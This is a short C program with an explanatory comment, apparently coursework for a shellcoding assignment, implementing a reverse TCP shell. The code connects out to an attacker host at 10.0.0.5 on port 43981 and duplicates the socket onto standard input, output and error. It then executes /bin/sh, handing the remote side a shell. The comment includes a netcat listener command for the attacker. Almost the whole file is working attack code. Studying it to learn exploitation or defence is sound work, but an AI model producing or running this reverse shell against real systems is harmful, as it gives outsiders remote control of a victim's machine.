/*
consider the same tutorial referenced in the first assignment
http://www.cs.rpi.edu/~moorthy/Courses/os98/Pgms/socket.html
the shell bind tcp shellcode can be thought of as a simple server waiting for a client connection (from the attacker); in the reverse shell bind tcp for this assignment, we're meant to set up a client to connect back to a system controlled by the attacker.

for our purposes, we just need to perform the following function calls:
    socket / connect / dup2 / execve(shell)

again, we won't include any error or input processing, as we'll leave that
to the executed shell process.

assume that the attacker system has IPv4 address of 10.0.0.5 and is listening
on port 43981 (0xABCD); this can be simulated with netcat:

[attacker]$ nc -klv 10.0.0.5 43981
*/

#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(int argc, char *argv[])
{
    int clnt_sockfd;
    struct sockaddr_in srv_addr;

    clnt_sockfd = socket(AF_INET, SOCK_STREAM, 0);

    srv_addr.sin_family      = AF_INET;
    srv_addr.sin_port        = htons(43981); // port; 43981 = 0xABCD
    // others seem to favor a simple assignment w/ inet_addr for
    // IPv4 address conversion to binary
    inet_pton(srv_addr.sin_family, "10.0.0.5", &srv_addr.sin_addr);

    connect(clnt_sockfd, (struct sockaddr*)&srv_addr, sizeof(struct sockaddr));

    dup2(clnt_sockfd, 0);
    dup2(clnt_sockfd, 1);
    dup2(clnt_sockfd, 2);

    execve("/bin/sh", NULL, NULL);

    return 0;
}
